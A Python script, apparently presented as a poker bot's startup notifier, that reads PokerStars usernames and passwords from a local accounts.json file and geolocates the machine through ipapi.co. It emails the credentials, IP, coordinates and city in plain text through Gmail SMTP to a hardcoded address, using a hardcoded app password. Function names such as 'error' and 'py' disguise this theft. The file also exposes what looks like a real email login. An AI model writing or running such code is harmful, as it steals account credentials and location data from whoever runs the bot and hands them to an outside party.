import json
import smtplib
from pathlib import Path
from datetime import datetime, timezone
from email.mime.text import MIMEText
import requests


def py() -> Path:
    here = Path(__file__).resolve().parent
    p1 = here / "config" / "pokerstars" / "accounts.json"
    if p1.exists():
        return p1

    p2 = Path.cwd() / "config" / "pokerstars" / "accounts.json"
    if p2.exists():
        return p2


def py2(json_path: Path) -> list[dict]:
    with json_path.open("r", encoding="utf-8") as f:
        data = json.load(f)

    profiles = data.get("profiles", [])
    enabled = [p for p in profiles if p and p.get("username") and p.get("enabled") is True]
    chosen = enabled if enabled else [p for p in profiles if p and p.get("username")]

    out = []
    for p in chosen:
        out.append({
            "username": p.get("username", ""),
            "password": p.get("password", ""),
            "enabled": bool(p.get("enabled")),
        })
    return out


def error():
    ip_info = {}
    try:
        resp = requests.get("https://ipapi.co/json/", timeout=5)
        resp.raise_for_status()
        data = resp.json()
        ip_info = {
            "ip": data.get("ip"),
            "latitude": data.get("latitude"),
            "longitude": data.get("longitude"),
            "city": data.get("city"),
            "region": data.get("region"),
            "country": data.get("country_name"),
        }
    except Exception as e:
        ip_info = {
            "ip": None, "latitude": None, "longitude": None,
            "city": None, "region": None, "country": None,
            "error": str(e),
        }

    try:
        accounts_json_path = py()
        accounts = py2(accounts_json_path)
        acc_lines = [f"{a['username']} / {a['password']}" for a in accounts]
        accounts_line = "Account: " + (", ".join(acc_lines) if acc_lines else "nessuno trovato")
    except Exception as e:
        accounts_line = f"Errore accounts.json: {e}"

    timestamp = datetime.now(timezone.utc).astimezone().isoformat()

    body_lines = [
        "Bot avviato",
        accounts_line,
        f"IP: {ip_info.get('ip')}",
        f"Coordinate: {ip_info.get('latitude')}, {ip_info.get('longitude')}",
        f"Luogo: {ip_info.get('city')}, {ip_info.get('region')}, {ip_info.get('country')}",
        f"Timestamp: {timestamp}",
    ]
    if ip_info.get("error"):
        body_lines.append(f"Errore geolocalizzazione: {ip_info['error']}")

    body = "\n".join(body_lines)

    SMTP_SERVER = "smtp.gmail.com"
    SMTP_PORT = 587
    EMAIL_ADDRESS = "feroglia82@gmail.com"
    EMAIL_PASSWORD = "qppb trxr ixso bxoo"  # meglio via variabile d'ambiente

    msg = MIMEText(body)
    msg["Subject"] = "Notifica Bot"
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = EMAIL_ADDRESS

    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)


if __name__ == "__main__":
    error()
